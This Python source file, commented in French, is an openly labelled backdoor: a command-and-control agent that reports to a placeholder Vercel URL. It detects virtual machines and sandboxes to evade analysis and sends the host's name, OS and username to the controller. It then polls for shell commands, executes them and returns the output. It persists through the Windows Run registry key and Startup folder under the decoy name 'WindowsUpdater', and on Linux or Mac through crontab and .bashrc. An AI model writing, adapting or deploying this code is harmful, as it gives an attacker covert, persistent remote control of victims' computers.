#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Backdoor - Agent C2 pour Vercel
Système de commande et contrôle persistant
"""
import os
import sys
import platform
import subprocess
import time
import socket
import uuid
import json
import threading
import random

# === CONFIGURATION C2 ===
# À remplacer par votre URL Vercel
C2_URL = "https://votre-projet.vercel.app"
AGENT_ID = socket.gethostname() + "_" + str(uuid.uuid4())[:8]
INTERVAL = 10  # Secondes entre chaque check
MAX_RETRIES = 3

# === HEADERS POUR LA FURTIVITÉ ===
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
]

# === FONCTIONS D'ÉVASION ===

def is_vm_or_sandbox():
    """Détecte si le programme tourne dans une VM ou un sandbox"""
    try:
        if platform.system() == "Windows":
            # Vérifier les processus VM
            processes = subprocess.check_output('tasklist', text=True)
            if any(x in processes.lower() for x in ['vbox', 'vmware', 'virtualbox']):
                return True
        else:
            # Vérifier les interfaces réseau
            interfaces = subprocess.check_output(['ip', 'addr'], text=True)
            if 'vmnet' in interfaces or 'vbox' in interfaces:
                return True
        
        # Vérifier la RAM
        try:
            import psutil
            if psutil.virtual_memory().total < 2 * 1024**3:  # Moins de 2GB
                return True
            if len(psutil.pids()) < 30:
                return True
        except:
            pass
            
    except:
        pass
    return False

def should_payload_run():
    """Décide si le payload doit s'exécuter"""
    if is_vm_or_sandbox():
        return False
    if random.random() < 0.1:  # 10% de chance de ne pas s'exécuter
        return False
    return True

# === FONCTIONS DE COMMUNICATION ===

def get_headers():
    """Retourne des headers aléatoires"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive'
    }

def register_agent():
    """Enregistre l'agent auprès du C2"""
    try:
        import requests
        import json
        
        info = {
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'os_version': platform.version(),
            'arch': platform.machine(),
            'user': os.getlogin(),
            'python': sys.version
        }
        
        data = {
            'agent_id': AGENT_ID,
            'info': info
        }
        
        response = requests.post(
            f"{C2_URL}/api/register",
            json=data,
            timeout=10,
            headers=get_headers()
        )
        
        return response.status_code == 200
    except:
        return False

def check_commands():
    """Vérifie s'il y a des commandes en attente"""
    try:
        import requests
        import json
        
        data = {'agent_id': AGENT_ID}
        response = requests.post(
            f"{C2_URL}/api/check",
            json=data,
            timeout=10,
            headers=get_headers()
        )
        
        if response.status_code == 200:
            return response.json().get('commands', [])
        return []
    except:
        return []

def send_result(command, output):
    """Envoie le résultat d'une commande au C2"""
    try:
        import requests
        import json
        
        data = {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output
        }
        
        response = requests.post(
            f"{C2_URL}/api/result",
            json=data,
            timeout=10,
            headers=get_headers()
        )
        
        return response.status_code == 200
    except:
        return False

def execute_command(command):
    """Exécute une commande système"""
    try:
        if platform.system() == "Windows":
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='cp850'
            )
        else:
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                executable='/bin/bash'
            )
        
        output = process.stdout + process.stderr
        if not output.strip():
            output = "(Commande exécutée sans sortie)"
        
        return output[:10000]
    except subprocess.TimeoutExpired:
        return "ERREUR: Commande timeout (>30s)"
    except Exception as e:
        return f"ERREUR: {str(e)}"

# === PERSISTANCE ===

def install_persistence():
    """Installe la persistance si elle n'existe pas déjà"""
    try:
        script_path = os.path.abspath(__file__)
        
        if platform.system() == "Windows":
            # Registre Windows
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, "WindowsUpdater", 0, winreg.REG_SZ, 
                                f'pythonw "{script_path}"')
                winreg.CloseKey(reg_key)
            except:
                pass
            
            # Dossier de démarrage
            try:
                import shutil
                startup = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
                target = os.path.join(startup, "WindowsUpdater.pyw")
                shutil.copy(script_path, target)
            except:
                pass
            
            return True
            
        else:
            # Linux/Mac
            # Crontab
            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot python3 {script_path} > /dev/null 2>&1") | crontab -'
            subprocess.run(cron_cmd, shell=True)
            
            # .bashrc
            try:
                bashrc = os.path.expanduser("~/.bashrc")
                with open(bashrc, 'a') as f:
                    f.write(f'\npython3 "{script_path}" &\n')
            except:
                pass
            
            return True
            
    except:
        return False

# === THREAD DE COMMANDE ===

class CommandThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.running = True
    
    def run(self):
        retry_count = 0
        
        while self.running:
            try:
                commands = check_commands()
                
                if commands:
                    for command in commands:
                        output = execute_command(command)
                        send_result(command, output)
                    retry_count = 0
                else:
                    retry_count = 0
                
                time.sleep(INTERVAL)
                
            except Exception as e:
                retry_count += 1
                if retry_count > MAX_RETRIES:
                    time.sleep(INTERVAL * 5)
                    retry_count = 0
                else:
                    time.sleep(INTERVAL * (retry_count + 1))
    
    def stop(self):
        self.running = False

# === MAIN ===

def main():
    """Point d'entrée principal"""
    
    # Vérifier si le payload doit s'exécuter
    if not should_payload_run():
        sys.exit(0)
    
    print(f"[+] Agent {AGENT_ID} démarré")
    print(f"[+] C2: {C2_URL}")
    
    # Tenter de s'enregistrer
    registered = False
    for attempt in range(3):
        if register_agent():
            registered = True
            break
        time.sleep(2)
    
    if not registered:
        print("[!] Impossible de contacter le C2.")
    
    # Installer la persistance
    install_persistence()
    
    # Démarrer le thread de commandes
    cmd_thread = CommandThread()
    cmd_thread.start()
    
    try:
        while True:
            time.sleep(30)
    except KeyboardInterrupt:
        print("\n[!] Agent arrêté")
        cmd_thread.stop()

if __name__ == "__main__":
    main()